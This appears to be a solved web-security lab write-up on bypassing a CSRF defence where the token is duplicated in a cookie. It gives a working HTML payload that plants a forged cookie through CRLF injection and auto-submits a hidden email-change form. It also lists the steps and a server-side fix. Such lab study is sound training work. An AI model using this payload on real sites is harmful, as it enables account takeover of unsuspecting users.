# Lab 6: CSRF Token Duplicated in Cookie
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
Double-submit pattern implemented insecurely.
Server only checks csrf cookie matches csrf body param.
No server-side record of valid tokens.

## Payload
```
<html>
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com">
      <input type="hidden" name="csrf" value="fake">
    </form>
    <img src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" 
    onerror="document.forms[0].submit();"/>
  </body>
</html>
```

## Steps
1. Intercepted email change request in Burp
2. Confirmed csrf body param just matches csrf cookie
3. Used CRLF injection to plant csrf=fake cookie
4. Set csrf body param to fake
5. Server compared fake==fake → accepted!
6. Delivered to victim → solved

## Why It Works
Server never stores valid tokens server-side.
Just compares cookie vs body param.
Attacker controls both → bypass complete.

## Fix
Store tokens server-side and validate against them.
Never rely on client-controlled double-submit alone.
